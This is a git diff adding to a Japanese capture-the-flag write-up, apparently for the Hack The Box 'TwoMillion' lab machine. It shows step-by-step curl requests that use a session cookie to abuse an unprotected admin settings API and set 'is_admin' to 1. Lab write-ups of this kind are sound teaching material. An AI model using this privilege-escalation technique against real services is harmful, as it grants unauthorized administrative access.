@@ -464,7 +464,7 @@ Connection: keep-alive
 ```
 
 上記の実行結果より, `401 Unauthorized` ステータスコードが返されていることが分かる. 
-ここで, BurpSuite により得られた以下の PHP セッションクッキーを利用してアクセスを試みてみる.
+ここで, BurpSuite により得られた以下の PHP セッションクッキーを利用してアクセスを試みる.
 
 ```txt
 Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
@@ -602,7 +602,7 @@ Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
 
 ```
 
-上記の実行結果より, 管理者権限はないことが分かる. 管理者権限を取得するために, `/api/v1/admin/vpn/generate` への POST リクエストを試みてみる.
+上記の実行結果より, 管理者権限はないことが分かる. 管理者権限を取得するために, `/api/v1/admin/vpn/generate` への POST リクエストを試みる.
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -631,5 +631,196 @@ Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
 <
 { [5 bytes data]
 * Connection #0 to host 2million.htb left intact
+
+```
+
+上記の実行結果より, `401 Unauthorised` ステータスコードが返されていることが分かる. そのため, `/api/v1/admin/settings/update` への PUT リクエストに切り替えてみる.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7ao7isbtl7rr623elri1chnbf0" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 06 Sep 2024 19:04:35 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [64 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+
+```
+
+上記の実行結果より, API から `Invalid content type.` が返されたことが分かる. 次に, `Content-Type` ヘッダを JSON に定義して, 再度 PUT リクエストを試みる.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7ao7isbtl7rr623elri1chnbf0" --header "Content-Type: application/json" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
+> Content-Type: application/json
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 06 Sep 2024 19:09:26 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [67 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: email"
+}
+
+```
+
+上記の実行結果より, `email` が指定されていないことが分かる. そのため, アカウント登録時に入力したメールアドレスを `email` に指定して, 再度 PUT リクエストを試みる.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7ao7isbtl7rr623elri1chnbf0" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
+> Content-Type: application/json
+> Content-Length: 25
+>
+} [25 bytes data]
+* upload completely sent off: 25 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 06 Sep 2024 19:12:19 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [70 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Missing parameter: is_admin"
+}
+
+```
+
+上記の実行結果より, `is_admin` が指定されていないことが分かる. そのため, `is_admin` を `true` にして, 再度 PUT リクエストを試みる.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7ao7isbtl7rr623elri1chnbf0" --header "Content-Type: application/json" --data '{"email":"test@test.com", "is_admin": true}' | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
+> Content-Type: application/json
+> Content-Length: 43
+>
+} [43 bytes data]
+* upload completely sent off: 43 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 06 Sep 2024 19:14:58 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [87 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Variable is_admin needs to be either 0 or 1."
+}
+
+```
+
+上記の実行結果より, `is_admin` は `0` か `1` しかとらないことが分かる. そのため, `is_admin` を `1` にして, 再度 PUT リクエストを試みる.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ curl -sv -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7ao7isbtl7rr623elri1chnbf0" --header "Content-Type: application/json" --data '{"email":"test@test.com", "is_admin": '1'}' | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+> PUT /api/v1/admin/settings/update HTTP/1.1
+> Host: 2million.htb
+> User-Agent: curl/8.7.1
+> Accept: */*
+> Cookie: PHPSESSID=7ao7isbtl7rr623elri1chnbf0
+> Content-Type: application/json
+> Content-Length: 40
+>
+} [40 bytes data]
+* upload completely sent off: 40 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 06 Sep 2024 19:16:56 GMT
+< Content-Type: application/json
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+<
+{ [51 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "id": 14,
+  "username": "test",
+  "is_admin": 1
+}
 
 ```
